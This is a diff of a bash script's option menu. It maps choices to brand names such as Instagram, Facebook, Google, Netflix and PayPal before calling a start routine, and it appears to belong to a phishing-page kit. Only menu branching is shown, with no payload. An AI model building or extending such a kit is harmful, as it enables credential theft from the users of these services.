@@ -36,35 +36,35 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
-if [[ $option == 1 || $option == 01 ]]; then
+if [[ $option == 1 || $option == 1 ]]; then
 server="instagram"
 start1
 
-elif [[ $option == 2 || $option == 02 ]]; then
+elif [[ $option == 2 || $option == 2 ]]; then
 server="facebook"
 start1
-elif [[ $option == 3 || $option == 03 ]]; then
+elif [[ $option == 3 || $option == 3 ]]; then
 server="snapchat"
 start1
-elif [[ $option == 4 || $option == 04 ]]; then
+elif [[ $option == 4 || $option == 4 ]]; then
 server="twitter"
 start1
-elif [[ $option == 5 || $option == 05 ]]; then
+elif [[ $option == 5 || $option == 5 ]]; then
 server="github"
 start1
-elif [[ $option == 6 || $option == 06 ]]; then
+elif [[ $option == 6 || $option == 6 ]]; then
 server="google"
 start1
 
-elif [[ $option == 7 || $option == 07 ]]; then
+elif [[ $option == 7 || $option == 7 ]]; then
 server="spotify"
 start1
 
-elif [[ $option == 8 || $option == 08 ]]; then
+elif [[ $option == 8 || $option == 8 ]]; then
 server="netflix"
 start1
 
-elif [[ $option == 9 || $option == 09 ]]; then
+elif [[ $option == 9 || $option == 9 ]]; then
 server="paypal"
 start1
 
